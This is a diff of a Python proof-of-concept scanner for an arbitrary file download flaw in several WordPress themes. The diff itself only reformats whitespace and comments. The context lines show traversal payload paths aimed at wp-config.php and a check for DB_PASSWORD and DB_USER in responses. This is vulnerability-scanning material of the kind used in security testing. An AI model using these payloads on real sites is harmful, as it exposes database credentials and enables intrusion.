@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urllib2
 
+
 class Vuln(ABVuln):
-    vuln_id = 'WordPress_0022' # 平台漏洞编号，留空
+    vuln_id = 'WordPress_0022'  # 平台漏洞编号，留空
     name = 'WordPress Multiple themes /download.php Arbitrary File Download'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_DOWNLOAD # 漏洞类型
+    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
     disclosure_date = '2014-12-24'  # 漏洞公布时间
     desc = '''
         download_file" variable is not sanitized.
@@ -23,6 +24,7 @@ class Vuln(ABVuln):
     product = 'WordPress'  # 漏洞应用名称
     product_version = 'WordPress Multiple themes'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '0999c6cf-6498-453e-9ecc-dfb8340a424c'
     author = '47bwy'  # POC编写者
@@ -35,7 +37,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-                
+
             payload = [
                 '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php',
                 '/wp-content/force-download.php?file=../wp-config.php',
@@ -66,7 +68,7 @@ class Poc(ABPoc):
                     continue
                 if 'DB_PASSWORD' in content and 'DB_USER' in content:
                     #args['success'] = True
-                    #args['poc_ret']['file_path'].append(verify_url)
+                    # args['poc_ret']['file_path'].append(verify_url)
                     self.target = verify_url
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                         target=self.target, name=self.vuln.name, url=url))
@@ -76,6 +78,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
